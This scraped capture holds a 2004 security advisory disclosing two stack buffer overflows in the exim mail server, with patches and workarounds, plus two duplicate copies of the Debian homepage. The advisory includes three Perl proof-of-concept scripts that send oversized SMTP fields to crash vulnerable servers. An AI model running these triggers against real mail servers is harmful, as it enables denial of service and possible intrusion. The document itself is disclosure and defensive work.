=== Content from www.guninski.com_0f74ae30_20250125_061423.html ===

## Buffer overflows in exim, yet still exim  much  better  than  windows

| | cyrillic logo  [Home](index.html)  **Security**  [Internet Explorer](browsers.html)  [Windows 2000](win2k.html)  [AIX](exploit.html)  [Netscape](netscape.html)  [Misc](misc.html)  **Other**  [Links](greets.html)  [Services](me.html)  [In the news](menews.html)  [Random stuff](rand/index.html)  **Contact**  guninski@guninski.com | Georgi Guninski security advisory #68, 2004  Buffer overflows in exim, yet still exim  much  better  than  windows  Systems affected: two bugs in exim 3.35 one of them present in exim 4.32  Risk:  Medium - not in default install Date: 6 May 2004  Legal Notice: This Advisory is Copyright (c) 2004 Georgi Guninski. You may distribute it unmodified. You  may  not  modify    it   and   distribute    it   or   distribute   parts of it without the author's written permission - this especially  applies  to so called "vulnerabilities databases"  and  securityfocus,  microsoft,    cert and mitre. If   you   want    to     link     to    this    content      use     the    URL: <http://www.guninski.com/exim1.html> Anything in this document may change without notice.  Disclaimer: The  information  in  this  advisory  is  believed   to   be   true   though it may be false. The opinions  expressed  in  this  advisory  and  program  are    my  own  and not   of   any     company.    The   usual   standard   disclaimer    applies, especially the fact that Georgi Guninski  is  not  liable  for    any  damages caused by direct  or  indirect    use  of  the  information  or  functionality provided  by  this  advisory  or  program.    Georgi   Guninski   bears   no responsibility for  content  or  misuse  of  this  advisory  or  program  or any derivatives thereof.  Description:  There are two stack based overflows in exim 3.35. One them (bug1) is easily exploitable. Ease of exploitation of the other one (bug2) is not clear, but i won't be surprised if it is exploitable. Too lazy to check for sure. (bug2) is also present in exim 4.32. Both bugs are not in default exim configuration and need enabling options.  Details:  bug1: in exim 3.35 in verify.c there are two occurences of: --- `sprintf(buffer, "%s:%.200s", sender_address,` --- where buffer is on the stack. This is classic stack overflow. This bug works if works if "sender\_verify = true" is in exim.conf To test for vulnerability: ./exi1.pl | nc localhost 25 then press enter.  bug2: in accept.c for exim 3.35 and in verify.c for exim 4.32 there is: --- `char hname[64]; char *t = h->text; char *tt = hname; char *verb = "is"; int len;  while (*t != ':') *tt++ = *t++; *tt = 0;`  --- this code is hit if "headers\_check\_syntax" is in exim.conf for 3.35 and "require verify          = header\_syntax" is in the .conf for 4.32 the difficulty of exploiting this is that "t" can have limited content, but can have arbitrary length.  To test for vulnerability for 3.35: ./exi2.pl | nc localhost 25 then press enter.  To test for vulnerability for 4.32: ./exi3.pl localhost 25  Fix:  Unofficial fix from me, but debian seems to agree with it.  for exim 3.35 for bug1: in verify.c find the following: sprintf(buffer, "%s:%.200s", sender\_address,   (sender\_host\_name != NULL)? sender\_host\_name :   (sender\_host\_address != NULL)? sender\_host\_address : ""); and sprintf(buffer, "%s:%.200s", sender\_address,   (sender\_host\_name != NULL)? sender\_host\_name :   (sender\_host\_address != NULL)? sender\_host\_address : "");  in both above cases replace "sprintf(buffer," with: "snprintf(buffer, sizeof(buffer),"  for bug2: in accept.c find: while (\*t != ':') \*tt++ = \*t++; and replace it with: while (\*t != ':' && tt < &hname[sizeof(hname)-2]) \*tt++ = \*t++;  for exim 4.32 for bug2: in verify.c find  while (\*t != ':') \*tt++ = \*t++; and replace it with: while (\*t != ':' && tt < &hname[sizeof(hname)-2]) \*tt++ = \*t++;  Note: you need to change some addresses in the perls below.  ----exi1.pl---------------------------------- `#!/usr/bin/perl # works if sender_verify = true is in exim.conf # written by georgi guninski # cannot be used in vulnerability databases or CVE print "HELO a\r\n"; my $ch=getc(); print "MAIL FROM: " . "v" x 300 ."\@vt" . "\r\n"; print "RCPT TO: BillGay\@localhost\r\n"; print "DATA\r\n"; #print "From" . " " x 65 . ":" . "ff fff ff" ."\r\n"; print "asdasd\r\n"; print "\r\n"; print ".\r\n"; print "QUIT\r\n";` ---------------------------------------------  ----exi2.pl---------------------------------- `#!/usr/bin/perl # works if headers_check_syntax is in exim.conf # written by georgi guninski # cannot be used in vulnerability databases  print "HELO a\r\nMAIL FROM: BillGay\@localhost\r\nRCPT TO: SteveNoBall\@localhost\r\n"; print "DATA\r\n"; my $ch=getc(); print "From" . " " x 275 . ":" ."vv v \r\n"; print "asdasd\r\n"; print "\r\n"; print ".\r\n"; print "QUIT\r\n";`  ---------------------------------------------   ----exi3.pl---------------------------------- `#!/usr/bin/perl  use IO::Socket;  my $port = $ARGV[1]; my $host = $ARGV[0];  # written by georgi guninski # cannot be used in vulnerability databases print "Written by georgi guninski\nCannot be used in vulnerability databases or CVE\n";  my $repl; my $socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => "TCP") || die "socket";  $repl= <$socket>; print "server replied ${repl}"; my $req  = "HELO a\r\n";  syswrite($socket,$req,length($req)); $repl= <$socket>; print "server replied ${repl}";   my $fromaddr="BillGay\@soft"; my $touser="SteveNoBall\@soft";  $req = "MAIL FROM: ${fromaddr}\r\n";  syswrite($socket,$req,length($req)); $repl= <$socket>; print "server replied ${repl}";  $req = "RCPT TO: ${touser}\r\n"; syswrite($socket,$req,length($req)); $repl= <$socket>; print "server replied ${repl}"; $req = "DATA\r\n";  syswrite($socket,$req,length($req)); $repl= <$socket>; print "server replied ${repl}";  print "Attached with debugger to exim and press enter\n"; my $ccc=getc();  $req = "From" . " " x 200 . ":" ." root\r\n";  $req .= "just to let you know that you sux\r\n"; $req .= ".\r\n";  syswrite($socket,$req,length($req)); $repl= <$socket>; print "server replied ${repl}";    while(<$socket>) { print $_; }   close $socket;`   ---------------------------------------------   Workaround: for exim 3.35 make sure you don't have the following options in exim.conf: --- sender\_verify = true headers\_check\_syntax --- for exim 4.32 make sure you don't have the following option in the config file: require verify          = header\_syntax  Vendor status: exim.org and debian are aware of the bugs  Georgi Guninski http://www.guninski.com | | --- | --- | |
| --- | --- | --- |
|  |

| [Home](index.html) | [Internet
Explorer](browsers.html) | [Windows 2000](win2k.html) | [AIX](exploit.html) | [Netscape](netscape.html) | [Links](greets.html) | [More...](index.html) |



=== Content from www.debian.org_ac28730a_20250125_061423.html ===

[![Debian](./Pics/openlogo-50.png)](./ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

# Debian

# The Community

## Debian is a Community of People!

### DC24 Group Photo

![DebConf23 Group Photo](Pics/debconf24_group_photo.jpg)

### MiniDebConf Berlin 2024

![Group photo of the MiniDebConf Berlin 2024](Pics/mini-dc24-berlin.jpg)

### MiniDebConf BrasÃ­lia 2023

![Group photo of the MiniDebConf BrasÃ­lia 2023](Pics/mini-dc23-brasilia.jpg)

### Screenshot Calamares Installer

![Screenshot from the Calamares installer](Pics/calamares-bookworm.png)

### Debian is like a Swiss Army Knife

![Debian is like a Swiss Army Knife](Pics/debian-swiss-knife-hands-1024x576.jpg)

### People have fun with Debian

![Debian people at Debconf18 in Hsinchu really having fun](Pics/debian-funny-people-1024x576.jpg)

[![](Pics/users.svg)](intro/people)

## [People](intro/people)

Who we are and what we do

[![](Pics/heartbeat.svg)](intro/philosophy)

## [Our Philosophy](intro/philosophy)

Why we do it, and how we do it

[![](Pics/user-plus.svg)](devel/join/)

## [Get Involved, Contribute](devel/join/)

How you can join us!

[![](Pics/list.svg)](intro/index#community)

## [More...](intro/index#community)

Additional information about the Debian community

# The Operating System

## Debian is a complete Free Operating System!

![Debian](Pics/debian-logo-1024x576.png)
[Download](https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-12.9.0-amd64-netinst.iso)
[Other downloads](distrib)

[![](Pics/trophy.svg)](intro/why_debian)

## [Why Debian](intro/why_debian)

What makes Debian special

[![](Pics/life-ring.svg)](support)

## [User Support](support)

Getting help and documentation

[![](Pics/security.svg)](security/)

## [Security Updates](security/)

Debian Security Advisories (DSA)

[![](Pics/list.svg)](intro/index#software)

## [More...](intro/index#software)

Further links to downloads and software

---

# Project News

## News and Announcements about Debian

17January2025[The Debian Project mourns the loss of Steve Langasek (vorlon)](News/2025/20250117)
11January2025[Updated Debian 12: 12.9 released](News/2025/20250111)
19November2024[The Debian Project mourns the loss of JÃ©rÃ©my Bobbio (Lunar)](News/2024/20241119)
31August2024[Updated Debian 11: 11.11 released](News/2024/2024083102)
14August2024[Security support for Bullseye handed over to the LTS team](News/2024/20240814)

[All the news](News)
[RSS](News/news)

---

This page is also available in the following languages:
Select your language
català
dansk
Deutsch
español
français
Galego
Indonesia
Italiano
magyar
Nederlands
norsk (bokmål)
polski
Português
suomi
svenska
Tiếng Việt
Български (Bəlgarski)
Русский (Russkij)
українська (ukrajins'ka)
عربية (Arabiya)
中文(简)
中文(HK)
中文(繁)
한국어 (Korean)
Ελληνικά (Ellinika)
فارسی (Farsi)

How to set [the default document language](./intro/cn)

---

See our [contact page](./contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Sat, Sep 16 13:09:56 UTC 2023

Last Built: Sun, Jan 19 23:26:10 UTC 2025

Copyright © 1997-2025 [SPI](https://www.spi-inc.org/) and others; See [license terms](./license)

Debian is a registered [trademark](./trademark) of Software in the Public Interest, Inc.



=== Content from www.debian.org_9644e4f0_20250125_061423.html ===

[![Debian](./Pics/openlogo-50.png)](./ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

# Debian

# The Community

## Debian is a Community of People!

### DC24 Group Photo

![DebConf23 Group Photo](Pics/debconf24_group_photo.jpg)

### MiniDebConf Berlin 2024

![Group photo of the MiniDebConf Berlin 2024](Pics/mini-dc24-berlin.jpg)

### MiniDebConf BrasÃ­lia 2023

![Group photo of the MiniDebConf BrasÃ­lia 2023](Pics/mini-dc23-brasilia.jpg)

### Screenshot Calamares Installer

![Screenshot from the Calamares installer](Pics/calamares-bookworm.png)

### Debian is like a Swiss Army Knife

![Debian is like a Swiss Army Knife](Pics/debian-swiss-knife-hands-1024x576.jpg)

### People have fun with Debian

![Debian people at Debconf18 in Hsinchu really having fun](Pics/debian-funny-people-1024x576.jpg)

[![](Pics/users.svg)](intro/people)

## [People](intro/people)

Who we are and what we do

[![](Pics/heartbeat.svg)](intro/philosophy)

## [Our Philosophy](intro/philosophy)

Why we do it, and how we do it

[![](Pics/user-plus.svg)](devel/join/)

## [Get Involved, Contribute](devel/join/)

How you can join us!

[![](Pics/list.svg)](intro/index#community)

## [More...](intro/index#community)

Additional information about the Debian community

# The Operating System

## Debian is a complete Free Operating System!

![Debian](Pics/debian-logo-1024x576.png)
[Download](https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-12.9.0-amd64-netinst.iso)
[Other downloads](distrib)

[![](Pics/trophy.svg)](intro/why_debian)

## [Why Debian](intro/why_debian)

What makes Debian special

[![](Pics/life-ring.svg)](support)

## [User Support](support)

Getting help and documentation

[![](Pics/security.svg)](security/)

## [Security Updates](security/)

Debian Security Advisories (DSA)

[![](Pics/list.svg)](intro/index#software)

## [More...](intro/index#software)

Further links to downloads and software

---

# Project News

## News and Announcements about Debian

17January2025[The Debian Project mourns the loss of Steve Langasek (vorlon)](News/2025/20250117)
11January2025[Updated Debian 12: 12.9 released](News/2025/20250111)
19November2024[The Debian Project mourns the loss of JÃ©rÃ©my Bobbio (Lunar)](News/2024/20241119)
31August2024[Updated Debian 11: 11.11 released](News/2024/2024083102)
14August2024[Security support for Bullseye handed over to the LTS team](News/2024/20240814)

[All the news](News)
[RSS](News/news)

---

This page is also available in the following languages:
Select your language
català
dansk
Deutsch
español
français
Galego
Indonesia
Italiano
magyar
Nederlands
norsk (bokmål)
polski
Português
suomi
svenska
Tiếng Việt
Български (Bəlgarski)
Русский (Russkij)
українська (ukrajins'ka)
عربية (Arabiya)
中文(简)
中文(HK)
中文(繁)
한국어 (Korean)
Ελληνικά (Ellinika)
فارسی (Farsi)

How to set [the default document language](./intro/cn)

---

See our [contact page](./contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Sat, Sep 16 13:09:56 UTC 2023

Last Built: Sun, Jan 19 23:26:10 UTC 2025

Copyright © 1997-2025 [SPI](https://www.spi-inc.org/) and others; See [license terms](./license)

Debian is a registered [trademark](./trademark) of Software in the Public Interest, Inc.


